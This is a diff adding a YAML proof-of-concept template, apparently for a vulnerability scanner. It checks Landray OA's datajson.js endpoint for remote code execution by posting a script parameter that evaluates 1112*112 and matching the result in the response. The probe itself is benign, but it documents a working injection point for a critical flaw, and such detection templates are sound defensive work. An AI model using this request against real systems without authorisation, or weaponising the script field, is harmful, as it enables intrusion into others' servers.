@@ -1,0 +1,21 @@
+id: poc-yaml-landray-oa-datajson-rce
+info:
+  name: 蓝凌OA datajson 命令执行
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: 蓝凌OA
+  osprey-id: vb_2022_0093
+requests:
+- method: POST
+  path: /data/sys-common/datajson.js
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: s_bean=sysFormulaSimulateByJS&script=1112*112
+  expression: 'status_code == 200 && contains(body, "\"fdId\":124544") && contains(body,
+    "{\"success\":true")
+
+    '
+variables: {}
+transport: http
